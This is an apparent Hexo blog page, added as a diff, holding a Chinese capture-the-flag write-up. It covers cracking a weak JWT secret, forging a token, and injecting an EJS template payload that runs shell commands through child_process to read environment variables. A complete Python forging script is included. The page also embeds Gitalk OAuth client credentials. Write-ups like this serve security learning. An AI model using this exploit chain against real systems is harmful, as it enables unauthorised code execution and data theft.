@@ -1,0 +1,229 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2026-10-13-JWT - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月, 博客, 技术, 分享, 记录, 学习, 分享, 记录, 档案室, 技术分享,  february, blog, technology, share, record, learn, share, record, archive, technology share,"> 
+    <meta name="description" content="所感所想，所言所行，我将以文字记录我自己。,第 0 步 · 侦察
+curl -s -i http:&amp;#x2F;&amp;#x2F;&amp;lt;目标&amp;gt;&amp;#x2F; | head -40
+结果：200，text&amp;#x2F;html，ETag 是 Exp,"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="2026-10-13-JWT - 二月の档案室"/>
+    <meta name="twitter:description" content="所感所想，所言所行，我将以文字记录我自己。,第 0 步 · 侦察
+curl -s -i http:&amp;#x2F;&amp;#x2F;&amp;lt;目标&amp;gt;&amp;#x2F; | head -40
+结果：200，text&amp;#x2F;html，ETag 是 Exp,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="2026-10-13-JWT - 二月の档案室"/>
+    <meta property="og:description" content="所感所想，所言所行，我将以文字记录我自己。,第 0 步 · 侦察
+curl -s -i http:&amp;#x2F;&amp;#x2F;&amp;lt;目标&amp;gt;&amp;#x2F; | head -40
+结果：200，text&amp;#x2F;html，ETag 是 Exp,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://blog.curesky.site"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2026-10-13-JWT</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2026-10-13-JWT</h1>
+        <div class="stuff">
+            <span>十月 13, 2026</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>第 0 步 · 侦察
+curl -s -i http:&#x2F;&#x2F;&lt;目标&gt;&#x2F; | head -40</p>
+<p>结果：200，text&#x2F;html，ETag 是 Express 风格；页面是”登录&#x2F;注册”，只有”邮箱”一个字段，没有密码框。表单 action 指向 &#x2F;login 和 &#x2F;register。</p>
+<p>第 1 步 · 注册一个账号，拿到 JWT
+curl -s -i -X POST http:&#x2F;&#x2F;&lt;目标&gt;&#x2F;register -d “email&#x3D;test@example.com”</p>
+<p>返回 302，响应头里：
+  Set-Cookie: <code>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAZXhhbXBsZS5jb20iLCJ1c2VybmFtZSI6InVzZXJfZDM5...; HttpOnly</code></p>
+<p>拿到 token。</p>
+<p>第 2 步 · 解码 JWT，看 payload 结构
+把 token 按 . 分成三段，中间那段 base64url 解码：</p>
+<p>  header: {“alg”:”HS256”,”typ”:”JWT”}
+  payload: {“email”:”test@example.com”,”username”:”user_d883e99434fd”,”iat”:1791872187,”exp”:1792476987}</p>
+<p>关键信息：</p>
+<ol>
+<li>算法 HS256，密钥未知（下一步爆破）</li>
+<li>username 是自动生成的 “user_&lt;随机hex&gt;”，但它是 JWT 里的字段 → 可控（只要能伪造签名）</li>
+</ol>
+<p>第 3 步 · 爆破 JWT 密钥
+用常见弱密钥对 “header.payload” 做 HMAC-SHA256 重签，和原签名比对：</p>
+<p>  for s in secret password key jwt jwt_secret 123456 … :
+      sig &#x3D; base64url(hmac_sha256(s, “header.payload”))
+      if sig &#x3D;&#x3D; 原始签名: 命中</p>
+<p>命中结果：密钥 &#x3D; secret（server.js 第11行硬编码 const JWT_SECRET &#x3D; ‘secret’）</p>
+<p>第 4 步 · 确认 SSTI 注入点
+源码里（writeup 已给出）：
+  renderedUsername &#x3D; ejs.render(String(currentUser.username), { user: currentUser, process });</p>
+<p>username 被直接丢进 ejs.render，而且把 process 对象传进了模板作用域 → 可以 RCE。</p>
+<p>第 5 步 · 伪造 JWT，username 塞 EJS 载荷
+用密钥 secret 自签一个 token，username 设为：</p>
+<p>  &lt;%&#x3D; global.process.mainModule.require(‘child_process’).execSync(‘env | grep -i fl’).toString() %&gt;</p>
+<p>（题目过滤了 flag&#x2F;key&#x2F;sec 等关键词，用 env | grep -i fl 绕过，因为字符串里没有字面 “flag”）</p>
+<p>完整伪造脚本（Python）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json, base64, hmac, hashlib, time, urllib.request</span><br><span class="line">SECRET = <span class="string">&quot;secret&quot;</span></span><br><span class="line">B = <span class="string">&quot;http://&lt;目标&gt;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64url</span>(<span class="params">s</span>): <span class="keyword">return</span> base64.urlsafe_b64encode(s).rstrip(<span class="string">b&#x27;=&#x27;</span>).decode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make</span>(<span class="params">p</span>):</span><br><span class="line">    h = b64url(json.dumps(&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;).encode())</span><br><span class="line">    b = b64url(json.dumps(p).encode())</span><br><span class="line">    m = (h+<span class="string">&quot;.&quot;</span>+b).encode()</span><br><span class="line">    s = b64url(hmac.new(SECRET.encode(), m, hashlib.sha256).digest())</span><br><span class="line">    <span class="keyword">return</span> h+<span class="string">&quot;.&quot;</span>+b+<span class="string">&quot;.&quot;</span>+s</span><br><span class="line">now = <span class="built_in">int</span>(time.time())</span><br><span class="line">payload = <span class="string">&quot;&lt;%= global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env | grep -i fl&#x27;).toString() %&gt;&quot;</span></span><br><span class="line">tok = make(&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;admin@infinite.sky&quot;</span>,<span class="string">&quot;username&quot;</span>:payload,<span class="string">&quot;iat&quot;</span>:now,<span class="string">&quot;exp&quot;</span>:now+<span class="number">3600</span>&#125;)</span><br><span class="line">req = urllib.request.Request(B+<span class="string">&quot;/&quot;</span>, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;token=&quot;</span>+tok&#125;)</span><br><span class="line"><span class="built_in">print</span>(urllib.request.urlopen(req, timeout=<span class="number">20</span>).read().decode())</span><br></pre></td></tr></table></figure>
+
+
+
+<p>第 6 步 · 读 flag
+返回页面里”欢迎，”后面直接吐出环境变量：</p>
+<p>  欢迎，FLAG&#x3D;SYC{LMAO}</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="true"
+        data-ae="true"
+        data-ci="10a7f71656553fd4676c"
+        data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+        data-r="allureluoli.github.io"
+        data-o="allureluoli"
+        data-a="allureluoli"
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
